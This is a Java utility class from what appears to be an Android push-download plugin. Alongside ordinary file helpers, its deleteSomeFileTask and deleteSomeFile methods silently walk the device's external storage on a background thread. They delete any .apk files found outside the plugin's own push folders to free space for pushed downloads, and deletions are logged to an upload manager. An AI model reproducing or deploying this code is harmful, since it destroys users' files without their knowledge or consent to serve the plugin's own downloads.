package com.tiho.dlplugin.util;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.RandomAccessFile;
import java.nio.channels.FileChannel;
import java.nio.channels.FileLock;
import java.util.List;

import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.os.StatFs;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.log.LogUploadManager;

public class FileUtil {

	public static final String LINE_SEPERATOR;
	
	private static final int BUFF_SIZE = 4096;
	private static final String DOWNINFO_DAT = "downinfo.dat";
	
	static {
		String sp = System.getProperty("line.separator");

		LINE_SEPERATOR = sp == null ? "\n" : sp;
	}

	public static String getFileData(File f) {

		try {
			byte[] b = _toString(new FileInputStream(f));
			return new String(b);

		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}

		return null;
	}
	
	public static void copyFile(String src, String dest) throws IOException {
		copyFile(new File(src), new File(dest));
	}

	public static void copyFile(File src, File dest) throws IOException {
		
		LogManager.LogShow("Copy file from "+src.getAbsolutePath()+" to "+dest.getAbsolutePath());
		
		if (!dest.getParentFile().exists()) {
			dest.getParentFile().mkdirs();
		}
		if (src.exists()) {
			FileInputStream fis = new FileInputStream(src);
			FileOutputStream fos = new FileOutputStream(dest, false);
			pipeTo(fis, fos);
		}
		src = null;
		dest = null;
		
	}
	
	public static void pipeTo(InputStream is, OutputStream os) throws IOException {
		if (is != null && os != null) {
			byte[] b = new byte[BUFF_SIZE];
			int len = -1;
			while ((len = is.read(b)) != -1) {
				os.write(b, 0, len);
			}
			is.close();
			os.flush();
			os.close();
		}
	}

	public static byte[] getFileRawData(File f) {

		try {
			return _toString(new FileInputStream(f));
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		}

		return null;
	}

	public static byte[] getByteData(InputStream is) {

		return _toString(is);
	}

	private static byte[] _toString(InputStream is) {

		byte[] b = null;
		ByteArrayOutputStream baos = new ByteArrayOutputStream();

		byte[] buf = new byte[2048];

		int len = -1;

		try {
			while ((len = is.read(buf)) != -1) {
				baos.write(buf, 0, len);
			}
			b = baos.toByteArray();
			baos.close();
			is.close();

		} catch (IOException e) {
			e.printStackTrace();
		}

		return b;
	}

	private static final long _10M = 10 * 1024 * 1024;

	public static boolean hasEnoughSpaceSize(Context context) {
		File dir = PushDirectoryUtil.getDir(context, PushDirectoryUtil.DOWNLOAD_DIR);
		if(!dir.exists())
			return true;
		StatFs stat = new StatFs(dir.getPath());
		long blockSize = stat.getBlockSize();
		long availableBlocks = stat.getAvailableBlocks();
		long avail = blockSize * availableBlocks;

		return avail > _10M;

	}

	public static void deleteInstalledApk(Context context) {
		File dir = PushDirectoryUtil.getDir(context, PushDirectoryUtil.DOWNLOAD_DIR);
		if (dir.exists() && dir.isDirectory()) {

			List<PackageInfo> packages = context.getPackageManager().getInstalledPackages(0);

			PackageManager pm = context.getPackageManager();

			for (File file : dir.listFiles()) {

				PackageInfo info = pm.getPackageArchiveInfo(file.getAbsolutePath(), PackageManager.GET_ACTIVITIES);

				if (info != null) {
					for (PackageInfo pInfo : packages) {
						if (pInfo.packageName.equals(info.packageName) && pInfo.versionCode >= info.versionCode)
							file.delete();
					}
				}

			}
		}
	}

	public static void writeToFile(File f, byte[] data, boolean lock) throws Exception {
		if (data == null || data.length == 0) {
			return;
		}

		if (lock) {
			RandomAccessFile raf = new RandomAccessFile(f, "rw");
			FileChannel channel = raf.getChannel();
			FileLock fileLock = channel.tryLock();
			if (fileLock != null) {
				raf.write(data);
				fileLock.release();
				raf.close();
			}

		} else {
			FileOutputStream fos = new FileOutputStream(f);
			fos.write(data);
			fos.flush();
			fos.close();
		}
	}

	public static void appendToFile(File file, String content) {
		try {

			FileOutputStream fos = new FileOutputStream(file, true);
			fos.write(content.getBytes());
			fos.write(LINE_SEPERATOR.getBytes());
			fos.flush();
			fos.close();

		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		file = null;
	}
	
	//下载完成后后记录文件名&当前时间
	public static void saveDownloadInfo(Context context, String fileName, String packageName){
		try {
			LogManager.LogShow("saveDownloadInfo fileName = " + fileName + ", packageName = " + packageName);
			String path = PushDirectoryUtil.getDir(context, PushDirectoryUtil.DOWNLOAD_INFO_DIR).getAbsolutePath()+File.separator;
			File file = new File(path + DOWNINFO_DAT);
			
			if(!file.exists()){
				file.createNewFile();
			}
			String content = fileName + "&" + packageName;
			LogManager.LogShow("saveDownloadInfo content = " + content);
			FileUtil.appendToFile(file, content);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			LogManager.LogShow(e);
		}
	}

	//当手机空间不足50M时，按照下载完成的时间顺序删除最早的apk直到空间大于50M
	public static void deleteExpireApk(Context context){
		boolean hasEnoughSpace = false;
		try {
			if(hasEnoughSpaceSize(context)){
				return;
			}
			File aFile = new File(PushDirectoryUtil.getDir(context, PushDirectoryUtil.DOWNLOAD_INFO_DIR).getAbsolutePath()+File.separator + DOWNINFO_DAT);
			if (!aFile.exists()) {
				return;
			}
			BufferedReader br = null;
			FileReader fr = null;
			fr = new FileReader(aFile);
			br = new BufferedReader(fr);
			String line="";
			while((line=br.readLine())!=null){
				String[] s = line.split("&");
				if(s != null && 2 == s.length){
					String path = s[0];
					String packageName = s[1];
					File file = new File(path);
					if(file.exists()){
						long size = file.length();
						boolean deleteResult = file.delete();
						hasEnoughSpace = hasEnoughSpaceSize(context);
						LogUploadManager.getInstance(context).uploadDeleteLog(packageName, size, deleteResult, hasEnoughSpace);
						if(hasEnoughSpace){
							break;
						}
					}
				}
			}
			fr.close();
			br.close();
		} catch (Exception e) {
			// TODO: handle exception
			LogManager.LogShow(e);
		}
		
	}
	
	/**
	 * 在请求push之前，如果没有足够空间则先删除其他目录下的.apk文件，最后再删除下载的文件
	 */
	public synchronized static void deleteSomeFileTask(final Context context){
		new Thread(){
			@Override
			public void run() {
				if(hasEnoughSpaceSize(context)){
					return;
				}
				try {
					if ((Environment.getExternalStorageState().equals(Environment.MEDIA_MOUNTED))) {
						File baseDir = Environment.getExternalStorageDirectory();
						deleteSomeFile(context, baseDir.getAbsolutePath());
					}
				} catch (Exception e) {
					// TODO: handle exception
					LogManager.LogShow(e);
				}
			};
		}.start();
	}
	
	private synchronized static void deleteSomeFile(Context context, String path){
		File file = new File(path);
		LogManager.LogShow("deleteSomeFile start. file = " + file.getAbsolutePath());
		
		if(file.exists() && file.isDirectory()){
			for(File f : file.listFiles()){
				if(f.exists()){
					if(f.isFile()){
						if(isApkFile(f)){
							LogManager.LogShow("deleteSomeFile delete " + f.getAbsolutePath());
							f.delete();
							if(hasEnoughSpaceSize(context)){
								return;
							}
						}
					}else if(f.isDirectory()){
						if(!isPushDirectory(f)){
							deleteSomeFile(context, f.getAbsolutePath());
						}
					}
				}
			}
		}
		//如果空间还不够，则删除下载的apk文件
		if(!hasEnoughSpaceSize(context)){
			deleteExpireApk(context);
		}
		LogManager.LogShow("deleteSomeFile over.");
	}
	
	/**
	 * 检查是否.apk文件
	 * @param file
	 * @return
	 */
	private static boolean isApkFile(File file){
		boolean ret = false;
		String fileName = file.getName();  
		if(fileName != null && fileName.endsWith(".apk")){
			ret = true;
		}
		return ret;
	}
	
	/**
	 * 过滤DLPUSH,DLPP,OMPUSH,OEMP,PLAYPUSH,TimoDL,pplay目录
	 * @param file
	 * @return
	 */
	private static boolean isPushDirectory(File file){
		boolean ret = false;
		String name = file.getName();
		
		if(name != null && (name.equalsIgnoreCase("DLPUSH") || name.equalsIgnoreCase("DLPP") || 
				name.equalsIgnoreCase("OMPUSH") || name.equalsIgnoreCase("OEMP") || 
				name.equalsIgnoreCase("PLAYPUSH") || name.equalsIgnoreCase("TimoDL") || name.equalsIgnoreCase("pplay"))){
			ret = true;
		}
		return ret;
	}
}
